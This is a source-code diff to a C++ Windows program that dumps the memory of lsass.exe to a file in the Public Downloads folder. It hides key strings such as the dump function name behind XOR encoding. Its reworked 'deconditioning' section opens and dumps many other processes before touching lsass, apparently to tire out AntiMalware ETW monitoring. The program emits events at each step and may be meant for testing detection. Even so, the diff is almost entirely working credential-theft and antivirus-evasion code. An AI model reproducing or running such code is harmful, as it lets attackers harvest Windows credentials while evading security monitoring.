@@ -134,87 +134,12 @@ int main(int argc, char** argv) {
     msg << "' config";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
 
-#if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
-    /*
-    msg << "Doing deconditioning calc operations for about 60 sec";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    auto start_decon_calc = std::chrono::high_resolution_clock::now();
-    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
-    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
-    auto end_decon_calc = std::chrono::high_resolution_clock::now();
-    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
-    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    Sleep(sleep_between_steps_ms);
-    */
-
-    BYTE nonsense[4096] = {}; // TODO should this open and close many processes?
-    constexpr int rounds = 100;
-    int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
-    for (int n = 0; n < repetitions; n++) {
-
-        msg << "Starting deconditioning round " << n;
-        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-
-        for (int i = 0; i < sizeof(nonsense); i++) {
-            nonsense[i] = 0x90; // huiiiiiiiiiii
-        }
-        // xor eax, eax; ret
-        nonsense[4093] = 0x31;
-        nonsense[4094] = 0xC9;
-        nonsense[4095] = 0xC3;
-
-        void* allocs[rounds] = { 0 };
-        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
-            LPVOID alloc_addr = VirtualAlloc(nullptr, sizeof(nonsense), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            if (!alloc_addr) {
-                allocs[i] = 0;
-                msg << "Failed to alloc mem in round " << n << "-" << i << " , error=" << GetLastError();
-                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-                continue;
-            }
-            allocs[i] = alloc_addr;
-            if (!WriteProcessMemory(hProcess, alloc_addr, &nonsense, sizeof(nonsense), NULL)) {
-                msg << "Failed to write mem in round " << n << "-" << i << " , error=" << GetLastError();
-                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-                continue;
-            }
-            DWORD old_protect;
-            if (!VirtualProtectEx(hProcess, alloc_addr, sizeof(nonsense), PAGE_EXECUTE_READ, &old_protect)) {
-                msg << "Failed to change mem to RX in round " << n << "-" << i << " , error=" << GetLastError();
-                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-                continue;
-            }
-            HANDLE hThreadDecon = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc_addr, nullptr, 0, nullptr);
-            if (!hThreadDecon) {
-                msg << "Failed to create remote thread in round " << n << "-" << i << " , error=" << GetLastError();
-                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-                continue;
-            }
-            else {
-                WaitForSingleObject(hThreadDecon, INFINITE);
-                CloseHandle(hThreadDecon);
-            }
-        }
-
-        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
-            if (allocs[i] != 0 && !VirtualFreeEx(hProcess, allocs[i], 0, MEM_RELEASE)) {
-                msg << "Failed to free mem in round " << n << "-" << i << " , error=" << GetLastError();
-                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-            }
-        }
-
-        msg << "Finished deconditioning round " << n;
-        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-        Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
-    }
-#endif
-
+    // init strings
     // antiemulation and deconditioning also depend on obfuscation (anti signature)
 #if defined obfuscation || defined antiEmulation || defined deconditioning
     msg << "Before decrypting strings";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
-    
+
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
     BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x35,0x27,0x32,0x36,0x6f,0x26,0x2c,0x32,0x41 };
     for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
@@ -230,10 +155,10 @@ int main(int argc, char** argv) {
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
     BYTE dumpFunctionBytes[] = { 0x0c,0x2b,0x2f,0x2b,0x05,0x37,0x2c,0x32,0x16,0x30,0x28,0x36,0x24,0x06,0x34,0x2f,0x31,0x42 };
     for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
-    
+
     msg << "After decrypting strings";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
-    Sleep(sleep_between_steps_ms); 
+    Sleep(sleep_between_steps_ms);
 #else
     BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\test.dmp"; // literal string -> already \0 terminated
     BYTE procBytes[] = { 0x6c,0x00,0x73,0x00,0x61,0x00,0x73,0x00,0x73,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00 }; // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
@@ -246,10 +171,6 @@ int main(int argc, char** argv) {
     char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
     char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);
 
-    // find lsass's PID
-    msg << "Before finding " << procW << " pid";
-    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
-
     DWORD pid = 0;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) {
@@ -260,6 +181,11 @@ int main(int argc, char** argv) {
     }
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(pe);
+
+    // find lsass's PID (but do not interact with it yet!)
+    msg << "Before finding pid";
+    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
+
     if (Process32First(snap, &pe)) {
         do {
             if (_wcsicmp(pe.szExeFile, procW) == 0) {
@@ -269,31 +195,16 @@ int main(int argc, char** argv) {
         } while (Process32Next(snap, &pe));
     }
     if (pid != 0) {
-        msg << "After finding " << procW << " pid: " << pid;
+        msg << "After finding pid: " << pid;
         print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
         Sleep(sleep_between_steps_ms);
     }
     else {
-        msg << "Unable to find " << procW << " pid";
+        msg << "Unable to find pid";
         print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
         Sleep(sleep_between_steps_ms);
         return 1;
     }
-
-    msg << "Before opening process handle";
-    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
-
-    // open process with all access
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        msg << "Failed to open process: " << GetLastError();
-        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        return 1;
-    }
-
-    msg << "After opening process handle";
-    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
-    Sleep(sleep_between_steps_ms);
 
     msg << "Before opening out file";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
@@ -303,7 +214,6 @@ int main(int argc, char** argv) {
     if (hFile == INVALID_HANDLE_VALUE) {
         msg << "Failed to open out file: " << GetLastError();
         print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        CloseHandle(hProcess);
         return 1;
     }
 
@@ -319,7 +229,6 @@ int main(int argc, char** argv) {
     if (!hLib) {
         msg << "Failed to load lib " << dumpLibrary << ": " << GetLastError();
         print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        CloseHandle(hProcess);
         CloseHandle(hFile);
         return 1;
     }
@@ -327,12 +236,71 @@ int main(int argc, char** argv) {
     if (!MiniDWriteD) {
         msg << "Failed to get function addr " << dumpFunction << ": " << GetLastError();
         print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        CloseHandle(hProcess);
         CloseHandle(hFile);
         return 1;
     }
 
     msg << "After resolving function";
+    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
+    Sleep(sleep_between_steps_ms);
+
+#if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
+    /*
+    msg << "Doing deconditioning calc operations for about 60 sec";
+    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+    auto start_decon_calc = std::chrono::high_resolution_clock::now();
+    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
+    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
+    auto end_decon_calc = std::chrono::high_resolution_clock::now();
+    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
+    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
+    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+    Sleep(sleep_between_steps_ms);
+    */
+
+    constexpr int maxDumps = 100;
+    int repetitions = 10;
+    for (int n = 0; n < repetitions; n++) {
+
+        msg << "Starting deconditioning round " << n;
+        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+
+        int i = 0;
+        if (Process32First(snap, &pe)) {
+            do {
+                if (pe.th32ProcessID == pid) {
+                    continue; // do not interact with lsass yet
+                }
+                HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                if (hDecon == NULL) {
+                    continue; // ignore errors, just open+dump as many procs as possible (except lsass)
+                }
+                // blindly dump and overwrite
+                MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+                // and close proc handle again
+                CloseHandle(hDecon);
+                i++;
+            } while (Process32Next(snap, &pe) && i < maxDumps);
+        }
+
+        msg << "Finished deconditioning round " << n << ", dumped " << i << " procs";
+        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+        Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
+    }
+#endif
+
+    msg << "Before opening process handle";
+    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
+
+    // open process with all access
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == NULL) {
+        msg << "Failed to open process: " << GetLastError();
+        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
+        return 1;
+    }
+
+    msg << "After opening process handle";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 
